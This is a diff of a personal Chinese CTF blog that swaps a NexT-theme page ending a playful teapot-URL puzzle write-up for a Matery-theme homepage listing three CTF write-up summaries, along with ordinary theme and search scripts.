-<p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fw5ib5zoouj30sc0cm774.jpg" alt=""><br>得到了点新东西<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.0 300 MULTIPLE CHOICES</span><br><span class="line"></span><br><span class="line">Alternates: &#123;&quot;/the_super_great_hidden_url_for_brewing_tea/black_tea&quot; &#123;type message/teapot&#125;&#125;</span><br></pre></td></tr></table></figure></p>
-<p>继续回到文档找相应的内容（google翻译后）：<br><img src="https://ws3.sinaimg.cn/large/006tNbRwly1fw5icih2buj30l0088dh8.jpg" alt=""><br><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fw5icp36tqj30xg0oc793.jpg" alt=""><br>可以知道我们可以选择black_tea来泡茶，选择的方式就是构造url。于是修改url为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/the_super_great_hidden_url_for_brewing_tea/black_tea</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://ws4.sinaimg.cn/large/006tNbRwly1fw5icwhelkj30sa0d4dip.jpg" alt=""><br>就可以得到flag{delivering_tea_to_DaLa0}，真的想给出题dalao递茶，给这脑洞跪了。</p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-  </section>
-
-  
-
-
-          </div>
-          
-
-        </div>
-        
-          
-  
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
-    </div>
-  </div>
-
-  <aside id="sidebar" class="sidebar">
-    
-    <div class="sidebar-inner">
-
-      
-
-      
-
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
-        <div class="site-overview">
-          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-            
-              <img class="site-author-image" itemprop="image"
-                src="https://ws2.sinaimg.cn/large/006tNbRwly1fx4h9ube01j30jg0jgjs3.jpg"
-                alt="L0ner" />
-            
-              <p class="site-author-name" itemprop="name">L0ner</p>
-              <p class="site-description motion-element" itemprop="description"></p>
-          </div>
-
-          
-            <nav class="site-state motion-element">
-              
-                <div class="site-state-item site-state-posts">
-                
-                  <a href="/archives/">
-                
-                    <span class="site-state-item-count">3</span>
-                    <span class="site-state-item-name">日志</span>
-                  </a>
+    </nav>
+</header>
+
+<style type="text/css">
+    /* don't remove. */
+    .index-cover {
+        height: 100vh;
+    }
+</style>
+
+<div class="bg-cover index-cover about-cover" style="background-image: url('/medias/cover.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col s10 offset-s1 m8 offset-m2 l8 offset-l2">
+                <div class="brand">
+                    <div class="title center-align">
+                    
+                        L0ner&#39;s blogs
+                    
+                    </div>
+
+                    <div class="description center-align">
+                    
+                        Believe myself !
+                    
+                    </div>
                 </div>
-              
-
-              
-
-              
-                
-                
-                <div class="site-state-item site-state-tags">
-                  <a href="/tags/index.html">
-                    
-                    
-                      
-                    
-                      
-                    
-                    <span class="site-state-item-count">1</span>
-                    <span class="site-state-item-name">标签</span>
-                  </a>
-                </div>
-              
-            </nav>
-          
-
-          
-
-          
-
-          
-          
-
-          
-          
-
-          
-            
-          
-          
-
+            </div>
         </div>
-      </section>
-
-      
-
-      
-
-    </div>
-  </aside>
-
-
         
-      </div>
-    </main>
+        <div class="cover-btns">
+            <a href="#recommend-sections" class="waves-effect waves-light btn">
+                <i class="fa fa-angle-double-down"></i>继续阅读
+            </a>
 
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-
-<div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
-  <span class="with-love" id="animate">
-    <i class="fa fa-user"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">L0ner</span>
-
-  
-  
-
-
-    <span class="post-meta-divider">|</span>
-    <span class="post-meta-item-icon">
-      <i class="fa fa-area-chart"></i>
-    </span>
-    
-      <span class="post-meta-item-text">站点总字数：</span>
-    
-    <span title="站点总字数">4k</span>
-  
-
-  
-    <span class="post-meta-divider">|</span>
-    <span class="post-meta-item-icon">
-      <i class="fa fa-coffee"></i>
-    </span>
-    
-      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
-    
-    <span title="站点阅读时长">4 分钟</span>
-  
+            
+        </div>
+        <div class="cover-social-link"></div>
+        
+    </div>
 </div>
 
-
-
-
-
-  <div class="powered-by"> 
-  <i class="fa fa-user-md"></i>
-
-  </div>
-
-
-  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动 v3.7.1</div>
-
-
-
-  <span class="post-meta-divider">|</span>
-
-
-
-  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/theme-next/hexo-theme-next">NexT.Gemini</a> v6.3.0</div>
-
-
-
-
-        
-
-
-
-
-
-
-
-
-        
-      </div>
-    </footer>
-
-    
-      <div class="back-to-top">
-        <i class="fa fa-arrow-up"></i>
-        
-      </div>
-    
-
-    
-
-  </div>
-
-  
-
-<script type="text/javascript">
-  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
-    window.Promise = null;
-  }
+<script>
+// Dynamically switch banner pictures every day.
+$('.bg-cover').css('background-image', 'url(/medias/banner/' + new Date().getDay() + '.jpg)');
 </script>
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  
-    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-  
-
-
-  
-
-
-  <script type="text/javascript" src="/js/src/utils.js?v=6.3.0"></script>
-
-  <script type="text/javascript" src="/js/src/motion.js?v=6.3.0"></script>
-
-
-
-  
-  
-
-
-  <script type="text/javascript" src="/js/src/affix.js?v=6.3.0"></script>
-
-  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.3.0"></script>
-
-
-
-  
-
-  
-
-
-  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.3.0"></script>
-
-
-
-  
-
-
-
-	
-
-
-
-
-
-  
-
-
-
-
-
-  
-
-
-
-
-
-
-
-
-
-
-  
-
-  <script type="text/javascript">
-    // Popup Window;
-    var isfetched = false;
-    var isXml = true;
-    // Search DB path;
-    var search_path = "search.xml";
-    if (search_path.length === 0) {
-      search_path = "search.xml";
-    } else if (/json$/i.test(search_path)) {
-      isXml = false;
-    }
-    var path = "/" + search_path;
-    // monitor main search box;
-
-    var onPopupClose = function (e) {
-      $('.popup').hide();
-      $('#local-search-input').val('');
-      $('.search-result-list').remove();
-      $('#no-result').remove();
-      $(".local-search-pop-overlay").remove();
-      $('body').css('overflow', '');
-    }
-
-    function proceedsearch() {
-      $("body")
-        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
-        .css('overflow', 'hidden');
-      $('.search-popup-overlay').click(onPopupClose);
-      $('.popup').toggle();
-      var $localSearchInput = $('#local-search-input');
-      $localSearchInput.attr("autocapitalize", "none");
-      $localSearchInput.attr("autocorrect", "off");
-      $localSearchInput.focus();
-    }
-
-    // search function;
-    var searchFunc = function(path, search_id, content_id) {
-      'use strict';
-
-      // start loading animation
-      $("body")
-        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
-          '<div id="search-loading-icon">' +
-          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
-          '</div>' +
-          '</div>')
-        .css('overflow', 'hidden');
-      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
-
-      
-
-      $.ajax({
-        url: path,
-        dataType: isXml ? "xml" : "json",
-        async: true,
-        success: function(res) {
-          // get the contents from search data
-          isfetched = true;
-          $('.popup').detach().appendTo('.header-inner');
-          var datas = isXml ? $("entry", res).map(function() {
-            return {
-              title: $("title", this).text(),
-              content: $("content",this).text(),
-              url: $("url" , this).text()
-            };
-          }).get() : res;
-          var input = document.getElementById(search_id);
-          var resultContent = document.getElementById(content_id);
-          var inputEventFunction = function() {
-            var searchText = input.value.trim().toLowerCase();
-            var keywords = searchText.split(/[\s\-]+/);
-            if (keywords.length > 1) {
-              keywords.push(searchText);
-            }
-            var resultItems = [];
-            if (searchText.length > 0) {
-              // perform local searching
-              datas.forEach(function(data) {
-                var isMatch = false;
-                var hitCount = 0;
-                var searchTextCount = 0;
-                var title = data.title.trim();
-                var titleInLowerCase = title.toLowerCase();
-                var content = data.content.trim().replace(/<[^>]+>/g,"");
-                
-                var contentInLowerCase = content.toLowerCase();
-                var articleUrl = decodeURIComponent(data.url);
-                var indexOfTitle = [];
-                var indexOfContent = [];
-                // only match articles with not empty titles
-                if(title != '') {
-                  keywords.forEach(function(keyword) {
-                    function getIndexByWord(word, text, caseSensitive) {
-                      var wordLen = word.length;
-                      if (wordLen === 0) {
-                        return [];
-                      }
-                      var startPosition = 0, position = [], index = [];
-                      if (!caseSensitive) {
-                        text = text.toLowerCase();
-                        word = word.toLowerCase();
-                      }
-                      while ((position = text.indexOf(word, startPosition)) > -1) {
-                        index.push({position: position, word: word});
-                        startPosition = position + wordLen;
-                      }
-                      return index;
-                    }
-
-                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
-                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
-                  });
-                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
-                    isMatch = true;
-                    hitCount = indexOfTitle.length + indexOfContent.length;
-                  }
-                }
-
-                // show search results
-
-                if (isMatch) {
-                  // sort index by position of keyword
-
-                  [indexOfTitle, indexOfContent].forEach(function (index) {
-                    index.sort(function (itemLeft, itemRight) {
-                      if (itemRight.position !== itemLeft.position) {
-                        return itemRight.position - itemLeft.position;
-                      } else {
-                        return itemLeft.word.length - itemRight.word.length;
-                      }
-                    });
-                  });
-
-                  // merge hits into slices
-
-                  function mergeIntoSlice(text, start, end, index) {
-                    var item = index[index.length - 1];
-                    var position = item.position;
-                    var word = item.word;
-                    var hits = [];
-                    var searchTextCountInSlice = 0;
-                    while (position + word.length <= end && index.length != 0) {
-                      if (word === searchText) {
-                        searchTextCountInSlice++;
-                      }
-                      hits.push({position: position, length: word.length});
-                      var wordEnd = position + word.length;
-
-                      // move to next position of hit
-
-                      index.pop();
-                      while (index.length != 0) {
-                        item = index[index.length - 1];
-                        position = item.position;
-                        word = item.word;
-                        if (wordEnd > position) {
-                          index.pop();
-                        } else {
-                          break;
-                        }
-                      }
-                    }
-                    searchTextCount += searchTextCountInSlice;
-                    return {
-                      hits: hits,
-                      start: start,
-                      end: end,
-                      searchTextCount: searchTextCountInSlice
-                    };
-                  }
-
-                  var slicesOfTitle = [];
-                  if (indexOfTitle.length != 0) {
-                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
-                  }
-
-                  var slicesOfContent = [];
-                  while (indexOfContent.length != 0) {
-                    var item = indexOfContent[indexOfContent.length - 1];
-                    var position = item.position;
-                    var word = item.word;
-                    // cut out 100 characters
-                    var start = position - 20;
-                    var end = position + 80;
-                    if(start < 0){
-                      start = 0;
-                    }
-                    if (end < position + word.length) {
-                      end = position + word.length;
-                    }
-                    if(end > content.length){
-                      end = content.length;
-                    }
-                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
-                  }
-
-                  // sort slices in content by search text's count and hits' count
-
-                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
-                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
-                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
-                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
-                      return sliceRight.hits.length - sliceLeft.hits.length;
-                    } else {
-                      return sliceLeft.start - sliceRight.start;
-                    }
-                  });
-
-                  // select top N slices in content
-
-                  var upperBound = parseInt('1');
-                  if (upperBound >= 0) {
-                    slicesOfContent = slicesOfContent.slice(0, upperBound);
-                  }
-
-                  // highlight title and content
-
-                  function highlightKeyword(text, slice) {
-                    var result = '';
-                    var prevEnd = slice.start;
-                    slice.hits.forEach(function (hit) {
-                      result += text.substring(prevEnd, hit.position);
-                      var end = hit.position + hit.length;
-                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
-                      prevEnd = end;
-                    });
-                    result += text.substring(prevEnd, slice.end);
-                    return result;
-                  }
-
-                  var resultItem = '';
-
-                  if (slicesOfTitle.length != 0) {
-                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
-                  } else {
-                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
-                  }
-
-                  slicesOfContent.forEach(function (slice) {
-                    resultItem += "<a href='" + articleUrl + "'>" +
-                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
-                      "...</p>" + "</a>";
-                  });
-
-                  resultItem += "</li>";
-                  resultItems.push({
-                    item: resultItem,
-                    searchTextCount: searchTextCount,
-                    hitCount: hitCount,
-                    id: resultItems.length
-                  });
-                }
-              })
-            };
-            if (keywords.length === 1 && keywords[0] === "") {
-              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
-            } else if (resultItems.length === 0) {
-              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
-            } else {
-              resultItems.sort(function (resultLeft, resultRight) {
-                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
-                  return resultRight.searchTextCount - resultLeft.searchTextCount;
-                } else if (resultLeft.hitCount !== resultRight.hitCount) {
-                  return resultRight.hitCount - resultLeft.hitCount;
-                } else {
-                  return resultRight.id - resultLeft.id;
-                }
-              });
-              var searchResultList = '<ul class=\"search-result-list\">';
-              resultItems.forEach(function (result) {
-                searchResultList += result.item;
-              })
-              searchResultList += "</ul>";
-              resultContent.innerHTML = searchResultList;
-            }
-          }
-
-          if ('auto' === 'auto') {
-            input.addEventListener('input', inputEventFunction);
-          } else {
-            $('.search-icon').click(inputEventFunction);
-            input.addEventListener('keypress', function (event) {
-              if (event.keyCode === 13) {
-                inputEventFunction();
-              }
-            });
-          }
-
-          // remove loading animation
-          $(".local-search-pop-overlay").remove();
-          $('body').css('overflow', '');
-
-          proceedsearch();
-        }
-      });
-    }
-
-    // handle and trigger popup window;
-    $('.popup-trigger').click(function(e) {
-      e.stopPropagation();
-      if (isfetched === false) {
-        searchFunc(path, 'local-search-input', 'local-search-result');
-      } else {
-        proceedsearch();
-      };
-    });
-
-    $('.popup-btn-close').click(onPopupClose);
-    $('.popup').click(function(e){
-      e.stopPropagation();
-    });
-    $(document).on('keyup', function (event) {
-      var shouldDismissSearchPopup = event.which === 27 &&
-        $('.search-popup').is(':visible');
-      if (shouldDismissSearchPopup) {
-        onPopupClose();
-      }
-    });
-  </script>
-
-
-
-
-
-  
-
-  
-
-  
-
-  
-
-  
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
+<main class="content">
+
+    
+
+    <div id="recommend-sections">
+    
+    
+
+
+
+    
+    </div>
+
+    
+
+    <!-- 所有文章卡片 -->
+    <article id="articles" class="container articles">
+        <div class="row article-row">
+            
+            <div class="article col s12 m6 l4" data-aos="zoom-in">
+                <div class="card">
+                    <a href="/2018/11/11/2018hctf/">
+                        <div class="card-image">
+                            
+                            
+                            <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="2018 HCTF Warmup writeup">
+                            
+                            <span class="card-title">2018 HCTF Warmup writeup</span>
+                        </div>
+                    </a>
+
+                    <div class="card-content article-content">
+                        <div class="summary">只有做这种签到题才能维持得了生活。进入题目可看到：
+
+点进去 hint 可看到：
+
+这个url有个很明显的文件包含，推测是文件包含漏洞。然后</div>
+                        <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2018-11-11
+                            </span>
+                            <span class="publish-author">
+                                
+                                <i class="fa fa-user fa-fw"></i>
+                                L0ner
+                                
+                            </span>
+                        </div>
+                    </div>
+
+                    
+                    <div class="card-action article-tags">
+                        
+                        <a href="/tags/CTF-writeup/" target="_blank">
+                            <span class="chip bg-color">CTF,writeup</span>
+                        </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+            
+            <div class="article col s12 m6 l4" data-aos="zoom-in">
+                <div class="card">
+                    <a href="/2018/10/15/huwangbei/">
+                        <div class="card-image">
+                            
+                            
+                            <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="“护网杯”部分题writeup">
+                            
+                            <span class="card-title">“护网杯”部分题writeup</span>
+                        </div>
+                    </a>
+
+                    <div class="card-content article-content">
+                        <div class="summary">迟来的签到题描述是“easy xor???”，提示这题需要用异或。下载一个txt文件，打开后里面有一串字符：
+AAoHAR0nJ1YlUVQ</div>
+                        <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2018-10-15
+                            </span>
+                            <span class="publish-author">
+                                
+                                <i class="fa fa-user fa-fw"></i>
+                                L0ner
+                                
+                            </span>
+                        </div>
+                    </div>
+
+                    
+                    <div class="card-action article-tags">
+                        
+                        <a href="/tags/CTF-writeup/" target="_blank">
+                            <span class="chip bg-color">CTF,writeup</span>
+                        </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+            
+            <div class="article col s12 m6 l4" data-aos="zoom-in">
+                <div class="card">
+                    <a href="/2018/10/12/whoami/">
+                        <div class="card-image">
+                            
+                            
+                            <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="Hackergame 2018 我是谁writeip">
+                            
+                            <span class="card-title">Hackergame 2018 我是谁writeip</span>
+                        </div>
+                    </a>
+
+                    <div class="card-content article-content">
+                        <div class="summary">这一题有两关题目描述打开题目随便点击Submit提交点东西，都是显示相同的东西。应该是提交得不对，还得找出正确的“我”出来。先看看源码，里头</div>
+                        <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2018-10-12
+                            </span>
+                            <span class="publish-author">
+                                
+                                <i class="fa fa-user fa-fw"></i>
+                                L0ner
+                                
+                            </span>
+                        </div>
+                    </div>
+
+                    
+                    <div class="card-action article-tags">
+                        
+                        <a href="/tags/CTF-writeup/" target="_blank">
+                            <span class="chip bg-color">CTF,writeup</span>
+                        </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+            
+        </div>
+    </article>
+
+</main>
+
+
+
+<footer class="page-footer bg-color">
+    <div class="container row center-align">
+        <div class="col s12 m8 l8 copy-right">
+            本站由&copy;<a href="https://blinkfox.github.io/" target="_blank">Blinkfox</a>基于
+            <a href="https://hexo.io/" target="_blank">Hexo</a> 采用
+            <a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">hexo-theme-matery</a>的主题搭建.
+        </div>
+        <div class="col s12 m4 l4 social-link"></div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+<!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title">搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input" autofocus="">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+</script>
+<!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fa fa-angle-up"></i>
+    </a>
+</div>
+
+
+<script src="/libs/materialize/js/materialize.min.js"></script>
+<script src="/libs/masonry/masonry.pkgd.min.js"></script>
+<script src="/libs/aos/aos.js"></script>
+<script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+<script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+<script src="/js/matery.js"></script>
 </body>
 </html>
